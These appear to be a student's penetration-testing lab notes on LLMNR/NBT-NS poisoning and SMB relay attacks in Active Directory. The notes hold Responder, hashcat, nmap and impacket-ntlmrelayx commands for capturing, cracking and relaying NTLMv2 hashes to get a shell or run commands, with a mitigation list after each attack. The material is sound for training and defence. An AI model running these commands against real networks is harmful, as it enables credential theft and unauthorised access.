## LLMNR Poisoning 
- For [reference](https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/)
- Used to identify hosts when DNS fails to do so
- Previously known as NBT-NS
- Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to   
-  `sudo responder -I eth0 -dwPv` -- this will give hash for user
- `hashcat --help | grep NTLM` -- this will give all module for NTLM in hashcat
- `hashcat -m 5600 hashes.txt /path/to/wordlist`
###### Mitigation
- To disable LLMNR and NBT-NS
	- `Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client > Turn Off Multicast Name Resolution > enable`
- If a company must use or cannot disable LLMNR/NBT-NS, the best course of action is 
	- Require Network Access Control
	- Require long and complex user passwords

## SMB Relay Attacks
- For [reference](https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/)
- Instead of cracking hashes gathered with Responder, we can instead relay hose hashes to specific machines and potentially gain access.
- Requirement:
	- SMB signing must be **disabled** or **not enforced** on the target.
	- Relayed user credentials must be admin on machine for any any real value
- By default, SMB signing is not enabled or enforced on workstations. It is enabled or enforced on servers
- `nmap --script=smb2-security-mode -p445 IP -Pn`
- SMB Relay
	- `sudo mousepad /etc/responder/Responder.conf` SMB and HTTP off
	- `sudo responder -I eth0 -dwP`
	- Now we have to set up NTML relay
		- `impacket-ntlmrelayx -tf targets.txt -smb2support` or 
		- `impacket-ntlmrelayx -tf targets.txt -smb2support -i` -- i for interactive session 
		- after getting interactive session use `nc 127.0.0.1 1100`
		- or `impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"` 
- In lab try it on user-2
###### Mitigation
- Enable SMB Signing on all devices
	- Pro: Completely stops the attack
	- Con: Can cause performance issues with file copies
- Disable NTLM authentication on network
	- Pro: Completely stops the attack
	- Con: if Kerberos stops working, windows defaults back to NTLM
- Account tiering
	- Pro: Limits domain admins to specific tasks (e.g. only log onto servers with need for DA)
	- Con: Enforcing the policy may be difficult
- Local admin restriction
	- Pro: Can prevent a lot of lateral movement
	- Con: Potential increase in the amount of service desk tickets

